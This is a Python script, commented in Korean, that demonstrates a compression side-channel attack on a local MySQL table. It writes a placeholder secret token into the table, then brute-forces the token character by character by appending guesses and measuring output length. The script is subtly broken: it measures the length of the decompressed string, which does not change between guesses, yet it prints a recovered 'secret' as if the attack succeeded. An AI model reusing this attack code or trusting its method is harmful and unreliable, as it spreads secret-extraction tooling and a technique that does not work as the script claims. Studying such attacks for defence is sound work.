import pymysql
import string

# DB 접속 정보
db_host = "127.0.0.1"      # 도커 컨테이너가 3306 -> 호스트 3306 매핑된 경우
db_user = "flask_user"
db_password = "flask_pass"
db_name = "flask_db"
DB_PORT = 3307

SECRET_TOKEN = "SUPER_SECRET_TOKEN_ABCDEFG"  # 실제 '민감 정보'라 가정

def setup_db():
    """compressed_data2 테이블을 만들고 초기화"""
    conn = pymysql.connect(host=db_host, user=db_user, password=db_password,
                           database=db_name, port=DB_PORT, charset='utf8mb4')
    with conn.cursor() as cursor:
        # 테이블 생성 (이미 존재하면 무시)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS compressed_data2 (
                id INT AUTO_INCREMENT PRIMARY KEY,
                data_col TEXT
            ) ENGINE=InnoDB;
        """)
        conn.commit()

        # id=1 레코드 생성 (data_col은 SECRET_TOKEN만 들어있다고 가정)
        cursor.execute("""
            INSERT INTO compressed_data2 (id, data_col)
            VALUES (1, %s)
            ON DUPLICATE KEY UPDATE data_col=VALUES(data_col);
        """, (SECRET_TOKEN,))
        conn.commit()
    conn.close()

def measure_length(guess_str):
    """
    data_col = SECRET_TOKEN + guess_str 로 저장 -> SELECT 후 길이 측정
    (실제로는 DB 내부 압축 결과와 무관하게, 복원된 문자열 길이만을 알 수 있음)
    """
    conn = pymysql.connect(host=db_host, user=db_user, password=db_password,
                           database=db_name, port=DB_PORT, charset='utf8mb4')

    combined = SECRET_TOKEN + guess_str  # SECRET + guess 합치기
    with conn.cursor() as cursor:
        # UPDATE data_col
        sql_update = """
            UPDATE compressed_data2
            SET data_col = %s
            WHERE id = 1
        """
        cursor.execute(sql_update, (combined,))
        conn.commit()

        # SELECT하여 rows 길이 확인 (단순히 python str 변환)
        sql_select = "SELECT data_col FROM compressed_data2 WHERE id=1"
        cursor.execute(sql_select)
        rows = cursor.fetchall()
        data_str = str(rows)  # e.g. "(('SUPER_SECRET_TOKEN_ABCDEFGaaa',),)"
    conn.close()

    return len(data_str)

def side_channel_attack():
    discovered = ""
    possible_chars = string.ascii_letters + string.digits + "_-{}"
    max_length = 30  # SECRET_TOKEN 길이를 30 정도 가정 (데모)

    for _ in range(max_length):
        best_char = None
        best_len = 9999999

        for ch in possible_chars:
            test_guess = discovered + ch
            length = measure_length(test_guess)
            if length < best_len:
                best_len = length
                best_char = ch

        discovered += best_char
        print(f"[+] Current discovered: {discovered} (length={best_len})")

    print(f"[!!!] Final discovered secret: {discovered}")

if __name__ == "__main__":
    print("[*] Setting up DB and table...")
    setup_db()
    print("[*] Start side-channel attack simulation...")
    side_channel_attack()
